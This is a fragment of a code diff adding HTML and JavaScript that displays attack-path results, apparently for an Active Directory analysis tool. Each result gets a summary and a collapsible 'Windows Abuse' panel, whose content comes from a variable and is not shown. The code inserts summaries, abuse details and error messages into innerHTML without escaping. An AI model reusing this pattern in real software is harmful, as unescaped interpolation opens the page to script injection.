+                                        <div style="color: #9ca3af; font-size: 0.6875rem; line-height: 1.4; margin-bottom: 0.5rem;">
+                                            ${abuseInfo.summary}
+                                        </div>
+                                        <button onclick="document.getElementById('${detailId}').style.display = document.getElementById('${detailId}').style.display === 'none' ? 'block' : 'none'"
+                                                style="background: #1e40af; color: #fff; border: none; padding: 0.25rem 0.5rem; border-radius: 0.25rem; font-size: 0.6875rem; cursor: pointer; margin-bottom: 0.5rem;">
+                                            📖 Windows Abuse
+                                        </button>
+                                        <div id="${detailId}" style="display: none; color: #d1d5db; font-size: 0.6875rem; line-height: 1.6; background: #000; padding: 0.75rem; border-radius: 0.25rem; margin-top: 0.5rem; font-family: 'Courier New', monospace;">
+                                            ${abuseInfo.details}
+                                        </div>
+                                    ` : `<div style="color: #9ca3af; font-size: 0.6875rem;">No abuse information available</div>`}
+                                </div>
+                            `;
+                        }
+                    }
+
+                    pathsHTML += `
+                            </div>
+                        </div>
+                    `;
+                });
+
+                resultsDiv.innerHTML = pathsHTML;
+
+            } catch (error) {
+                console.error('Path query error:', error);
+                resultsDiv.innerHTML = `<div class="error-banner">❌ Error: ${error.message}</div>`;
+            }
+        }
+
     </script>
 </body>
 </html>
